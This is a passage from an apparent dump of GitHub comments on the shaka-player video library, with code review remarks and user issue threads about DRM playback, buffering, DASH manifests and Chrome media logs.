it to shaka.abr.SimpleAbrManager.bind(null, this.video_).  See how we do this for textDisplayFactory.. This needs the full type shaka.abr.Ewma.. Please namespace global constants.  (you also can't use var under our new style rules)\njs\nshaka.abr.EwmaVideoQualityEstimator.FAST_WINDOW = 1;. This file needs a copyright header.. All fields need a type using either @type for public fields or @private for private ones.. We have a utility class for this.  shaka.util.Timer. First, you should only throw shaka.util.Error (the compiler will yell at you).  Second, it would be better to use feature detection and avoid using this type instead of throwing.. We have a utility class for event listeners, shaka.util.EventManager.. The style is to keep all the arguments aligned.  So please do either:\njs\nthis.clearBuffer_(mediaState, mediaState.waitingToFlushBuffer,\n                  mediaState.deferredClearBufferOffset);\nOr\njs\nthis.clearBuffer_(\n    mediaState, mediaState.waitingToFlushBuffer,\n    mediaState.deferredClearBufferOffset);. Since this is dependent on safeMargin == 0, you could put this as part of line 2191.. I think a better name would be clearBufferSafeMargin, or something including safeMargin, to be consistent.. \"Deferred\" is fine here, but again, I think it should include safeMargin instead of offset.. This deserves a comment for what this will do.  You should also include a part about browser compatibility for having this value be too small.. This is the callback from AbrManager.  If you want to change this, you'll need to change the definitions in externs/shaka/abr_manager.js and in SimpleAbrManager to match the new function signature.. You should also add an entry to AUTHORS.. js\nif (safeMargin) {\n  p = ...\n} else {\n  p = this.playerInterface_.mediaSourceEngine.clear(mediaState.type).then(() => {\n    if (!this.destroyed_ && flush)\n      return this.playerInterface_.mediaSourceEngine.flush(mediaState.type);\n  });\n}\np.then(() => {\n  if (this.destroyed_) return;\n  shaka.log.debug(logPrefix, 'cleared buffer');\n  ...\n});. That's fine.. Because with streaming content the browser fires encrypted events when it sees a pssh box, so we don't need to parse it.. This would probably be best done in shaka.offline.DownloadManager since we are downloading the segments anyway.  Plus you should check every segment since there can be pssh boxes in following segments for key rotation.. This just appears to be a utility method, so it should be fine to move it out of here.. It's fine that DrmEngine is initialized first, you just need to remove the error that is thrown because of missing init data.  Then you can use drmEngine.newInitData from DownloadManager to signal DrmEngine to create a new session.  Lastly, update the offline manifest object before storing it with the new session IDs.. This needs to be indented.  Running ./build/all.py will check for style violations.. If you set this to Promise.resolve(), you can have @return {!Promise}.. Suggestion:\n\nSets the server certificate based on the current DrmInfo.. await. await. This would probably be easier to read as ES6 using await and try/catch.. Please use the namespace qualified version.  We have had problems in the past using the literal name.\n\njs\nconst mslaurlNode = shaka.util.XmlUtils.findChildNS(element.node, 'urn:microsoft:playready', 'laurl');\nThis would also allow the element to be called <mspr:laurl> or <laurl> with the correct namespace.. You should add a warning log.. Same, use findChildNS.. Uint16Array  can represent a sub-array, but this code doesn't work for it.  So I suggest having this accept an ArrayBuffer to make that requirement clear.. No longer needed.. I don't think this isn't the correct namespace URI.. Use shaka.util.Uint8ArrayUtils.toBase64.. Uint16Array uses the host byte ordering, but I think the PlayReady data always uses the same byte ordering.  You should use DataView.. Indentation appears off below this.. You should move shaka.dash.MpdUtils.parseXml to XmlUtils and use that instead.  That will catch parse errors since DOMParser doesn't throw exceptions for invalid XML.. You can pass the start and end to the Uint16Array constructor.. Couldn't you just do new Uint8Array(recordData, byteOffset, byteLength)?. This won't work since it will parse from the beginning of the buffer, not the beginning of the record.  You should edit the parseXml to accept a BufferSource instead and just pass record.value.. In that case, you should convert to a string here since the data will be UTF-16, not UTF-8 like the later string conversion expects.  Skipping every other byte like this only works for ASCII.. ",
    "nocarryr": "@jbroberg Have you tried with the latest Wowza release?\nIn the release notes for 4.3.0 it looks like this fix might be related:\n\n\nFixed MPEG-DASH live MPDs so that the timeShiftBufferDepth is reported correctly. A bug was introduced in the 4.2.0.01 update that caused the value to be off by a factor of 90, such that a buffer depth of 16 seconds would actually be reported as 24 minutes\n\n\nI've been testing with Wowza 4.3.0 and the current master branch (d84428b) and have had pretty stable and promising results.\n. :+1: \n@vaage  Thanks for helping to make shaka-player such a great product!. ",
    "arikkrol1": "I'll check on Sunday. Thanks.\nOn Sat, Oct 10, 2015, 01:13 Joey Parrish notifications@github.com wrote:\n\n@arikkrol1 https://github.com/arikkrol1 Can you reproduce on master? We\nbelieve this may have been caused by #184\nhttps://github.com/google/shaka-player/issues/184, which has been fixed.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/google/shaka-player/issues/193#issuecomment-146997930\n.\n. \n",
    "R4c00n": "Found the solution in the Demo app.\njavascript\nplayer.configure({enableAdaption: false});\nplayer.selectVideoTrack(trackId);\n. ",
    "MegaLabs1": "No, elemental packager\n. I can give you a link but it'll be encrypted one, and you'll coudn't decrypt it. Does it make sense?\n. It looks ok, checked for 1920x1080.\n\n. It seems i've found something interesting:\n00:00:00 558    debug DecryptingAudioDecoder: failed to init decoder on decryptor\n00:00:00 561    audio_dds   true\n00:00:00 561    audio_decoder   FFmpegAudioDecoder\n00:00:00 561    debug   Video rendering in low delay mode.\n00:00:00 570    video_dds   false\n00:00:00 570    video_decoder   DecryptingVideoDecoder\n00:00:00 570    pipeline_state  kPlaying\n00:00:00 570    seek_target 3571154.25\n00:00:00 570    pipeline_state  kSeeking\n00:00:00 570    pipeline_state  kPlaying\n00:00:00 580    debug   DecryptingDemuxerStream: no key\n00:00:00 580    debug   DecryptingVideoDecoder: no key\n00:00:01 184    event   PLAY\n00:00:12 923    info    Video codec: avc1.4d4028\n00:00:12 993    event   PAUSE\n00:00:13 336    seek_target 3571166\n00:00:13 336    pipeline_state  kSeeking\n00:00:13 336    pipeline_state  kPlaying\n00:00:13 495    debug DecryptingVideoDecoder: no key\n. 1. We use Shaka 1.5.1 \n2. Yes, there is a error message about key \n3. EME Logger returns \n   CreateSessionCall\n   target: MediaKeys\n   returned: {\n   \"type\": \"MediaKeySession\"\n   }\n   GenerateRequestCall\n   initDataType: cenc\n   initData: {\n   \"type\": \"ArrayBuffer\"\n   }\n   target: MediaKeySession\n   returned: {\n   \"type\": \"Promise\"\n   }\n   GenerateRequestCall Promise Result\n   status: resolved\n   result: null\n   messageEvent\n   type: message\n   time: Thu Oct 22 2015 09:48:43 GMT+0300 (RTZ 2 (\u0437\u0438\u043c\u0430))\n   event: MediaKeyMessageEvent\n   target element: MediaKeySession\n   UpdateCall\n   response: {\n   \"0\": 8,\n   \"1\": 2,\n   \"2\": 18,\n   \"3\": 157,\n   \"4\": 3,\n    <\u2026>\n   \"708\": 83,\n   \"709\": 41,\n   \"710\": 104,\n   \"type\": \"Uint8Array\"\n   }\n   target: MediaKeySession\n   returned: {\n   \"type\": \"Promise\"\n   }\n   UpdateCall Promise Result\n   status: resolved\n   result: null\n   keystatuseschangeEvent\n   type: keystatuseschange\n   time: Thu Oct 22 2015 09:48:43 GMT+0300 (RTZ 2 (\u0437\u0438\u043c\u0430))\n   event: Event\n   target element: MediaKeySession\nIs there an error with decrypting or in the key request session? It looks like update call returns some values\n. UPD: Issue solved. The problem was in Google policies for HD content. We decreased recommended security level for HD content in widevine proxy settings and... it works!\n. Thanks, Doolali\nIs it an Edge or Shaka restriction? (I mean Edge does not support widevine CDM, for example)\n. We use shaka 1.5. \n\n\nIs the problem reproducible on the demo page on appspot?\nWell, it seems Shaka stores everything in its buffer. Can we clear it with api call? \n it is about 25 minutes, can we reduce this caching level? \n. UPDATE. I have been watching live video at appspot demo site for 8 hours. Chrome ate 400 MB of RAM. In this case i used lighter profile (264 kbps instead of 7200 kbps and 3 hours), but it seems the problem is still present.\n. > For example, you will be able to say \"buffer 10 minutes ahead, but only leave 30 seconds behind, and stop early if we hit 100MB.\"\n\n\nThis is exatcly what we need! Thanks! Can we walk through the improvements on shaka2?\n. Looks like we have problems with FullHD profiles only. I tried Android LG G4 with Chrome+Shaka and it showed exactly the same short freezes with audio and video. Otherwise, 720p profile works correct without errors (about 4mbps video, 128kbps audio). Any suggestions?\n. Yes it is still a problem, but we reduced maximum quality for shaka with 720p resolution.\nwhat logs could be usefull for you? \n. thanks, Joey, we'll try it in our lab.\n. Hi, @joeyparrish ! \nit is not clear, it seems we use some other build (1.6.4): \nshaka.setLevel(shaka.log.Level.DEBUG)\nVM1651:2 Uncaught TypeError: Cannot read property 'Level' of undefined(\u2026)\nplayer.getStats()\nVM1828:2 Uncaught TypeError: player.getStats is not a function(\u2026)\nwhat version should we use?\n. shaka.log.setLevel(shaka.log.Level.DEBUG)\nVM2157:2 Uncaught TypeError: Cannot read property 'setLevel' of undefined(\u2026)\n\nYou should also be using an uncompiled version of the library to get logging.\n\ni think it is the reason why we cannot get logs.. \n. Yes, i am satisfied with your answer, thanks.\n. cpeterso,\nhere are links to manifests that reproduce the problem in FireFox:\nhttps://staging-play.megafon.tv/out/u/v1-video-11.mpd?scheme=https\nhttps://staging-play.megafon.tv/out/u/v1-video-14.mpd?scheme=https\n. Please, try out these:\nhttps://staging-playvip.megafon.tv/out/u/v1-video-11.mpd?scheme=https\nhttps://staging-playvip.megafon.tv/out/u/v1-video-14.mpd?scheme=https. @cpeterso, you can use https://staging-widevine.megafon.tv:8081/cenc/getlicense/inventosmegalabs as the custom license server. @joeyparrish, sorry for long time response. I've tested another manifest that plays in FireFox correctly. There is also availabilityStartTime changing during manifest updates (in +- 5 seconds interval), but this doesn't affect on playing.. Main question for us is will this issue gone after upgrading shaka to latest version?\nI've attached mpd.(Converted to txt)\ntest.txt\n. Yes I can. But stream is encrypted.\nIf I'll provide you with\n\nlive url\ncookie\nwidevine url\n\ncould you check playback?. Hello Joe!\nI've send url's and cookie privately to your email.. ",
    "shaharmor": "I agree with your answer, but my situation is a little bit different.\nI am not the owner of the application, but instead i am writing a plugin for shakaplayer, and in order for it to work seamlessly i need to bind to some events of the player.\nAsking the application developer to do that by himself is indeed possible, but will cause the implementation of the plugin to be more complicated.\nIf i will have a single place where i can either find all instantiated players, or bind to a global event that will let me know when one is being instantiated, the plugin implementation will be just to include the script instead of having to add additional code.\nHope it makes sense.\n. @ismena Are you going to use your own HLS provider or hls.js? I highly recommend hls.js \ud83d\udc4d . That would be perfect\nOn Tue, 29 Nov 2016 at 22:57 Joey Parrish notifications@github.com wrote:\n\nThe two parameters to a networking plugin are uri and request\nhttp://nightly.shaka-player-demo.appspot.com/docs/api/shaka.net.HttpPlugin.html.\nWe could easily add RequestType\nhttp://nightly.shaka-player-demo.appspot.com/docs/api/shaka.net.NetworkingEngine.html#RequestType\nto the Request\nhttp://nightly.shaka-player-demo.appspot.com/docs/api/shakaExtern.html#Request\nstructure.\nThen you could compare request.type to RequestType.SEGMENT or\nRequestType.MANIFEST in your plugin. Would that help?\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/602#issuecomment-263696297,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AKW9YGon4d1Er2rBcGrkfVX6I6P-gCnwks5rDJGegaJpZM4K3hrk\n.\n. So what happens if you decide that you need to start playback at time +4s, but it took you to get that segment 6s? You are now 2s behind where you wanted to be at.\n\nAlso, what you're saying can cause an issue that if I have 10s segments and minBufferTime of 6s, if ShakaPlayer decides to start playing at the middle of a segment, it will need 2 segments to start playing instead of 1 (because it will only have 5s in the buffer, even that it downloaded 10s of buffer).\nI really think this messes things up, and should at least be configureable (And off by default).. @TheModMaker I appreciate your response.\nI understand that your decision on where to start playback is not related to the download time.\nMy concern is, that if I set my segments to 10s, and the minBufferTime to 6s, I expect that playback will start once the user downloads 1 segment, and not 2.\nBut if ShakaPlayer decides that it starts playback somewhere in the middle of that 1st segment, it will have less than the required minBufferTime of 6s in the buffer and thus require another segment download, which will then cause more loading time to start playback.\nI think that it should be configurable on whether to start playback \"now\" (as you said), or at the beginning of the segment that \"now\" is in. And honestly I think that the default should be at the beginning of the segment.\nI have seen situations where \"now\" was set to 9s inside a 10s segment, which caused Shaka to download a whole 10s segment just for that 1s of buffer, which seems to be a really odd decision.\nIt makes playback loading time unpredictable because it depends not only on your download speed, but also on what time you started watching the stream.. Hey, thanks for the quick replies.\nI didn't say I want it to run in a node environment...\nAll I'm looking for is to have a parser that I can give a manifest string to (Not the URL, but the actual contents of the manifest), and it will parse it and return the parsed manifets object.\nIf you'd prefer to not extract it to a different module, you can instead expose it on the global shaka object or something of that sort so it can be accessible without having to actually play a video and pass a URL.\nDoes that makes sense?. Lets forget for a moment about extracting it to a different module. I think that got the whole conversation in the wrong direction.\nThe DashParser today is doing two things:\n1. Fetch a manifest from a given URL.\n2. Parse that fetched manifest and return its representation.\nSide note: I think that the parser should only parse the manifest (Expose the .parseManifest method) and not be responsible for also fetching the manifest.\nWhat I would like to have is a way to use the DashParser's parsing logic, without having it go over the network and fetch a manifest.\nPreferably it would look something like this:\njs\nconst DashParser = require('shaka-player/dash/DashParser');\nconst parser = new DashParser();\nconst manifest = parser.parseManifest(dashManifestString);\nThe issue is that today its not possible to require only the DashParser part of shaka.\nIs it possible to keep the parser within this project, but still expose it so users can use it without using the full player? And only using its parsing logic?. My goal is to have a battle-tested parser that I can use in order to parse a DASH manifest to something I can work with.\nCreating my own or using something that is not widely used can work, it will just not be as good as something that a lot of users are trying and that keeps being updated.\nI don't see any reason to write my own parser when you guys have a really good one already.. ",
    "wolenetz": "@ddorwin, correct: the error state of HTMLMediaElement is extended by MSE to include similar sources of errors (media parsing and decoding) that would occur in a regular non-MSE src=URL playback.\nSpecifically, in MSE's end of stream algorithm, as run by the append error algorithm, which is run when the asynch processing of appended media encounters decode error:\n\"If the HTMLMediaElement.readyState attribute equals HAVE_NOTHING\n- Run the \"If the media data can be fetched but is found by inspection to be in an unsupported format, or can otherwise not be rendered at all\" steps of the resource fetch algorithm.\nIf the HTMLMediaElement.readyState attribute is greater than HAVE_NOTHING\n- Run the media data is corrupted steps of the resource fetch algorithm.\"\nThese trigger fatal decode error steps in the HTMLMediaElement. When similar happens in a src= playback, would further fetching, seeking, etc be expected to succeed without restarting the load algorithm?\n. If you try in Chrome and obtain a failure repro, take a look at chrome://media-internals. Especially in more recent builds of chrome (beta or dev branches), there could be some informative logs available for the failed playback.\n. appendStream() essentially invokes the segment parser loop in a loop (like looping appendBuffer() with minor changes to make sure updatestart/end happen at most once per appendStream()). As such, the spec language requires appendStream's loop to abort if the segment parser loop aborted (which happens just after it runs the append error algorithm, just like in appendBuffer()). Outside of the built-in loop and using ReadableStream instead of an ArrayBuffer[View], appendStream() differs from appendBuffer() in that the former can run the coded frame eviction algorithm more than once (and that any such runs within the asynch loop portion do not result in QuotaExceededErr, rather append error algorithm without decode error, if not enough frames could be evicted).\nIn short, if GC within appendStream()'s asynch loop can't evict enough to make room, the appendStream() is aborted, but the HTMLMediaElement's fetching/load algorithms aren't aborted. But if decode err indeed occurred within appendStream()'s asynch loop, the result should be very similar to appendBuffer() of same media hitting decode error.\n. Sounds good to me. @ddorwin, regarding appendStream() side-track: abort of appendStream() without decode error can additionally be reached if the stream gets into a bad state:\nIf stream.state equals \"errored\", then run the append error algorithm with the decode error parameter set to false and abort this algorithm.\nIf stream.state does not equal \"readable\", then run the append error algorithm with the decode error parameter set to false and abort this algorithm.\n. That's quite ugly. Does the same situation occur with the Edge browser?\n. Chrome MSE supports multiplexed unencrypted streams. Note that a discontinuity detected in one component of the stream will impact all other components of the stream. One thing to note is that MSE SourceBuffer doesn't expose the 'buffered' ranges for each component, just their intersection TimeRanges. This means that there could be buffered media for some component(s) outside of those intersection TimeRanges, and may complicate player usage of arbitrary muxed streams, especially if the player doesn't have accurate metadata (or the streams aren't muxed to match that metadata precisely).\nIn Chrome MSE, each component of a multiplexed stream, like each standalone non-multiplexed component, is exposed to the decoding/playback pipeline internally the same way. For EME, however, I'm unclear if the key information/etc is extracted and reported correctly if it is meant to be used for more than one component. I defer to @ddorwin on that point.\n-- edited to correct link to @ddorwin\n. I'll try building a debug chrome and get more detailed logs from a repro (assuming I can get a repro first...). No repro on Chrome Linux 70.3538.110, though language is 'en'.\nBut setting it to 'de' gets a repro. Faster repro URL:\nhttps://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=https://storage.googleapis.com/shaka-demo-assets/sintel/dash.mpd;lang=de;build=uncompiled. The limited amount if info in chrome://media-internals for a repro suggests to me that this error occurs before reaching HAVE_METADATA. I'll dig into local repro logs next.. I couldn't get a local tip-of-tree Chrome release build to repro this. I noticed also that even if I picked a specific \"Text language\" different from that in the URL and then click Load a second time that the chosen text language is not used. Is that a known issue, perhaps related?. Ah I have a successful local repro now from tip-of-tree. Analyzing logs.... Relevant portion of a repro log:\n```\nchunk_demuxer.cc(650)] AddId id=4bd9c84b-1517-4d18-a265-b566829cfc20 content_type=audio/webm codecs=opus\nframe_processor.cc(300)] FrameProcessor()\nwebm_stream_parser.cc(124)] ChangeState() : 0 -> 1\nchunk_demuxer.cc(1086)] GetGenerateTimestampsFlag(4bd9c84b-1517-4d18-a265-b566829cfc20)\nsource_buffer.cc(142)] SourceBuffer this=0x22fdca0d9480\nsource_buffer.cc(174)] setMode this=0x22fdca0d9480 newMode=\"segments\"\nchunk_demuxer.cc(1086)] GetGenerateTimestampsFlag(4bd9c84b-1517-4d18-a265-b566829cfc20)\nchunk_demuxer.cc(1078)] IsParsingMediaSegment(4bd9c84b-1517-4d18-a265-b566829cfc20)\nchunk_demuxer.cc(1095)] SetSequenceMode(4bd9c84b-1517-4d18-a265-b566829cfc20, 0)\nframe_processor.cc(316)] SetSequenceMode(0)\nmedia_source.cc(218)] addSourceBuffer this=0x63425043530 type=\"audio/webm; codecs=\\\"opus\\\"\" -> 0x22fdca0d9480\nmedia_source.cc(329)] isTypeSupported(\"video/webm;codecs=\\\"vp9\\\";framerate=\\\"23.80952380952381\\\";bitrate=\\\"204094\\\";width=\\\"426\\\";height=\\\"182\\\"\") -> true\nmedia_source.cc(329)] isTypeSupported(\"video/webm; codecs=\\\"vp9\\\"\") -> true\nmedia_source.cc(150)] addSourceBuffer this=0x63425043530 type=\"video/webm; codecs=\\\"vp9\\\"\"\nmedia_source.cc(329)] isTypeSupported(\"video/webm; codecs=\\\"vp9\\\"\") -> true\nchunk_demuxer.cc(650)] AddId id=bdcb5d46-9e17-4f3b-8797-170b3dcc0972 content_type=video/webm codecs=vp9\nframe_processor.cc(300)] FrameProcessor()\nwebm_stream_parser.cc(124)] ChangeState() : 0 -> 1\nchunk_demuxer.cc(1086)] GetGenerateTimestampsFlag(bdcb5d46-9e17-4f3b-8797-170b3dcc0972)\nsource_buffer.cc(142)] SourceBuffer this=0x22fdca0d9840\nsource_buffer.cc(174)] setMode this=0x22fdca0d9840 newMode=\"segments\"\nchunk_demuxer.cc(1086)] GetGenerateTimestampsFlag(bdcb5d46-9e17-4f3b-8797-170b3dcc0972)\nchunk_demuxer.cc(1078)] IsParsingMediaSegment(bdcb5d46-9e17-4f3b-8797-170b3dcc0972)\nchunk_demuxer.cc(1095)] SetSequenceMode(bdcb5d46-9e17-4f3b-8797-170b3dcc0972, 0)\nframe_processor.cc(316)] SetSequenceMode(0)\nmedia_source.cc(218)] addSourceBuffer this=0x63425043530 type=\"video/webm; codecs=\\\"vp9\\\"\" -> 0x22fdca0d9840\nsource_buffer.cc(680)] HighestPresentationTimestamp this=0x22fdca0d9480, pts=0\nsource_buffer.cc(680)] HighestPresentationTimestamp this=0x22fdca0d9840, pts=0\nchunk_demuxer.cc(1036)] SetDuration(888.053)\nhtml_media_element.cc(3303)] durationChanged(0xdd2cda69f38, 888.053, false)\nhtml_media_element.cc(3310)] durationChanged(0xdd2cda69f38) : nan -> 888.053\nmedia_source.cc(607)] SetReadyState this=0x63425043530 : \"open\" -> \"ended\"\nchunk_demuxer.cc(1117)] MarkEndOfStream(0)\nchunk_demuxer.cc(1214)] ReportError_Locked(12)\nchunk_demuxer.cc(1198)] ChunkDemuxer::ChangeState_Locked() : 1 -> 4\nhtml_media_element.cc(3303)] durationChanged(0xdd2cda69f38, 888.053, false)\nwebmediaplayer_impl.cc(1603)] OnError\nder_media_log.cc(30)] MediaEvent: PIPELINE_ERROR DEMUXER_ERROR_COULD_NOT_OPEN\nwebmediaplayer_impl.cc(2603)] SetNetworkState(4)\nhtml_media_element.cc(1698)] setNetworkState(0xdd2cda69f38, 4) - current state is 2\nhtml_media_element.cc(1627)] MediaLoadingFailed(0xdd2cda69f38, 4, message='\"DEMUXER_ERROR_COULD_NOT_OPEN\"')\nhtml_media_element.cc(1541)] NoneSupported(0xdd2cda69f38, message='\"DEMUXER_ERROR_COULD_NOT_OPEN\"')\nmedia_source.cc(607)] SetReadyState this=0x63425043530 : \"ended\" -> \"closed\"\nsource_buffer.cc(655)] RemovedFromMediaSource this=0x22fdca0d9480\nchunk_demuxer.cc(723)] RemoveId id=4bd9c84b-1517-4d18-a265-b566829cfc20\nframe_processor.cc(305)] ~FrameProcessor()\nsource_buffer.cc(655)] RemovedFromMediaSource this=0x22fdca0d9840\nchunk_demuxer.cc(723)] RemoveId id=bdcb5d46-9e17-4f3b-8797-170b3dcc0972\nframe_processor.cc(305)] ~FrameProcessor()\n:chunk_demuxer.cc(518)] Stop()\n:chunk_demuxer.cc(1174)] Shutdown()\n:chunk_demuxer.cc(1198)] ChunkDemuxer::ChangeState_Locked() : 4 -> 5\nwebmediaplayer_impl.cc(2829)] UpdatePlayState_ComputePlayState: is_remote=0, must_suspend=0, idle_suspended=0, background_suspended=0, can_stay_suspended=0, is_stale=0, have_future_data=0, paused_=1, seeking_=1\nwebmediaplayer_impl.cc(2685)] SetDelegateState(0, 1)\nwebmediaplayer_impl.cc(2746)] SetSuspendState(0)\nhtml_media_element.cc(2511)] pause(0xdd2cda69f38)\nhtml_media_element.cc(2518)] pauseInternal(0xdd2cda69f38)\nhtml_media_element.cc(3510)] updatePlayState(0xdd2cda69f38) - shouldBePlaying = false, isPlaying = false\n:INFO:CONSOLE(706)] \"Player error\", source: https://nightly-dot-shaka-player-demo.appspot.com/demo/main.js (706)\n. @joeyparrish Glad I could help - sorry about the delay. Of note, the path to error I found in my repro looks like mediaSource.endOfStream() was called before HAVE_METADATA readyState on the attached HTMLMediaElement was reached. I'll look into adding an informative error log message of some kind for that condition in Chrome in addition to the existing basic \"DEMUXER_ERROR_COULD_NOT_OPEN\" pipeline error message for this case.. This is the related MSE spec issue that was hit by the repro: https://github.com/w3c/media-source/issues/212. ",
    "hackerdude": "Opera TV browser (which is Opera Presto with the MediaSource/EME extensions). Runs on various STBs.\nWithout access to the SourceBuffer, it looks like (pcode) would look like:\njavascript\n      if (typeof(_sb.appendBuffer) == 'function') {\n        _sb.appendBuffer(initData)\n      } else {\n        //pcode\n        _sb.emit('updatestart')\n        _sb.emit('update')\n        _sb.append(new Uint8Array(initData))\n        _sb.emit('updateend')\n      }\nThis would be in source_buffer_manager.js and offline_video_source.js.\nI forked and I'm making a branch to play around with. No checkins yet. First I want to get it to work.\n. ",
    "Biggytv": "This would be helpful to me too.\n. ",
    "leandromoreira": "I could create a PR for both approach if you will.\n. Or yet just a documentation with all available events to listen to, or weather we should rely on <video> tag events. :)\nshaka: playing, error, ...\nvideo: stalled...\nFor instance I'm trying to listen for buffering events and I tried:\njavascript\n_player.addEventListener('bufferingStart', this._bufferingHandler.bind(this))\n_player.addEventListener('bufferingEnd', this._bufferingFullHandler.bind(this))\nIt calls my buffering functions but not always, I still need to rely on video tag staled, waiting and even doing some tricks within progress events to track buffering.\nPS: I need buffering events for many reason, one of them being show/hide spinner.\n. Thanks @joeyparrish ! \nYes for 1) and 2) I might be wrong about buffering events being unreliable. Let me check deeper about this first.\n. BTW @joeyparrish I just ported shaka as a playback to the player Clappr, thank you very much, you guys did an amazing work, it was very easy to integrate/use/learn shaka :beers: \n. yes, I did! \nWe still need to rely on stalled, waiting events and some tricks while the video is in progress.\nWe're going to use a mix of these techniques + shaka events\nAbout the use of constants (shaka.player.Player.BufferingEventStart...) or documentation listing all the events, what approach do you like most?\n. @joeyparrish yes, thanks :)\n. Thanks :+1: \n. Thank you so much @joeyparrish :congratulations: \n. > Did you run ./build/test.py ?\nYes, I think I had.\n\nYou will need to update karma.conf.js to match, as that has glob patterns for all the test files\n\nMy bad, I'll update my PR.\n\nBecause you put tests for lib/utils/ into test/utils/, you now have test utilities (previous contents of test/utils) mixed with tests of utilities. \n\nCan we move the test utilities from lib/utils to lib/utilities? and then add the new glob pattern. Thank you very much for the feedbacks.\n. I'm gonna make a new PR.\n. > Please keep lib/util as is. We don't want to change the namespace of library code, and we want the folders to match the namespaces.\nIn my mind I was thinking about test/util \u00ac\u00ac, but I think the idea of test/test is much superior.\n. :metal:\n. @joeyparrish I liked your suggestion number 2.\n\nAdd a config flag for AbrManager that is similar to dash.js's setLimitBitrateToPortal. If set, AbrManager will use the size of the video element as an additional limitation. This flag won't affect any other part of the system, such as the track list. This option is simpler for the app developer but less flexible. It also requires the library to poll the video element's size, which is ugly.\n\nI was browsing through the docs looking for something similar but I didn't find it, the only thing I found was to restrict statically the max|min Height|Width|Pixels, anyway, is anyone working on this? Or are you still interested in this feature? \nBtw, HLS.js also has this feature under the config capLevelToPlayerSize.\nFor sure HLS.js also needs to query the size from time to time.\n. @kuznetcoff777 I think this http://www.unified-streaming.com/blog/stop-numbering-underappreciated-power-dashs-segmenttimeline can help you understand how it is possible to signalize discontinuities in Dash.. I read some closed issues:\n\nhttps://github.com/google/shaka-player/issues/754#issuecomment-295810431\nhttps://github.com/google/shaka-player/issues/622#issuecomment-284894082\nhttps://github.com/google/shaka-player/issues/386#issuecomment-221031218\n\nAnd all of them stick with this notion of wallclock, I'll set the right AST but I still would like to know if this clock sync is required for all live streaming and why on earth dashjs support this.. Thank you @sandersaares  \ud83d\ude04 . Hi nice people, \nI changed my server-side implementation to rely on the sequential scheme ($Number) to avoid this AST timing but the player still shows, seemingly timing errors about cannot find segment t=500002.838. \n(v2.3.0-uncompiled, demo app running locally, MacOS 10.13, Firefox 58.0.1) \nPlease noticed that I didn't update my availabilityStartTime.\nShould I remove the t from <S>? Also, shouldn't Shaka discard any attempt to get timing in this scheme?\nxml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<MPD xmlns=\"urn:mpeg:dash:schema:mpd:2011\" xmlns:ns1=\"http://www.w3.org/2001/XMLSchema-instance\" availabilityStartTime=\"2017-10-18T16:23:54Z\" minBufferTime=\"PT2S\" minimumUpdatePeriod=\"PT0S\" publishTime=\"2017-12-06T13:41:34Z\" timeShiftBufferDepth=\"PT120S\" type=\"dynamic\" ns1:schemaLocation=\"urn:mpeg:dash:schema:mpd:2011 DASH-MPD.xsd\" profiles=\"urn:mpeg:dash:profile:isoff-live:2011,http://dashif.org/guidelines/dash-if-simple\">\n  <Period start=\"PT0S\" id=\"0\">\n    <AdaptationSet id=\"1990\" mimeType=\"audio/mp4\" contentType=\"audio\" lang=\"por\" segmentAlignment=\"true\" startWithSAP=\"1\" audioSamplingRate=\"48000\">\n      <Representation id=\"1988\" bandwidth=\"96000\" codecs=\"mp4a.40.5\">\n        <SegmentTemplate timescale=\"1\" media=\"116_audio-$Number$.mp4\" startNumber=\"4463029\" initialization=\"data:video/mp4;base64,CAFE\">\n          <SegmentTimeline>\n            <S t=\"5263668\" d=\"10\" r=\"12\"/>\n          </SegmentTimeline>\n        </SegmentTemplate>\n      </Representation>\n    </AdaptationSet>\n    <AdaptationSet id=\"1989\" mimeType=\"video/mp4\" contentType=\"video\" frameRate=\"30/1\" segmentAlignment=\"true\" startWithSAP=\"1\" par=\"16:9\" maxWidth=\"768\" maxHeight=\"432\">\n      <Representation id=\"1986\" bandwidth=\"626000\" codecs=\"avc1.64001F\" sar=\"1:1\" width=\"512\" height=\"288\">\n        <SegmentTemplate timescale=\"1\" media=\"116_626-$Number$.mp4\" startNumber=\"4463029\" initialization=\"data:video/mp4;base64,CAFE\">\n          <SegmentTimeline>\n            <S t=\"5263668\" d=\"10\" r=\"12\"/>\n          </SegmentTimeline>\n        </SegmentTemplate>\n      </Representation>\n      <Representation id=\"1987\" bandwidth=\"1485000\" codecs=\"avc1.64001F\" sar=\"1:1\" width=\"768\" height=\"432\">\n        <SegmentTemplate timescale=\"1\" media=\"116_1485-$Number$.mp4\" startNumber=\"4463029\" initialization=\"data:video/mp4;base64,CAFE\">\n          <SegmentTimeline>\n            <S t=\"5263668\" d=\"10\" r=\"12\"/>\n          </SegmentTimeline>\n        </SegmentTemplate>\n      </Representation>\n    </AdaptationSet>\n  </Period>\n</MPD>. I also tried to use the Elemental Delta segmenter to generate DASH but it doesn't play as well. Here's their generated MDP.\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n```. I'm planning to find a way to expose these resource so you can test it.. thanks, @TheModMaker I'll take a closer look at it ;D. I was trying to understand what you've described and I'm still wondering how this information is used to determine the segment that Shaka needs to request.\nFor instance, I ran a ruby program here to understand the relation between these variables (mostly availabilityStartTime, SegmentTemplate@timescale and S@t )\n```ruby\nAST_UTC=1511113302\n=> 1511113302\nNOW=Time.now.to_i\n=> 1518199697\nLIVE_EDGE=NOW - AST_UTC\n=> 7086395 (is this the wallclock?)\nt_x=339163178623\n=> 339163178623 (last S@t for audio)\ntimescale=48000\n=> 48000 (ts for audio)\nSTARTS_AT=t_x/timescale\n=> 7065899\nLIVE_EDGE\n=> 7086395\nSTARTS_AT\n=> 7065899\n(LIVE_EDGE-STARTS_AT)\n=> 20496\n(LIVE_EDGE-STARTS_AT)/60/60\n=> 5 (in hours)\n``\nAt the end how does shaka uses theS@t` to determine the Segment to request?. Thank you very much @TheModMaker I learned more here and I'll read the docs again =D but if I have any relevant doubt I'll post it here.. Hi @TheModMaker @sandersaares and @joeyparrish thank you again for the attention and help, \nI read the guideline and ISO again (at least the sections on the timeline) and I'm still with some doubts, but first, let's see if I really understood it right.\nLet's continue with this pseudo code scenario, after that I'll post my 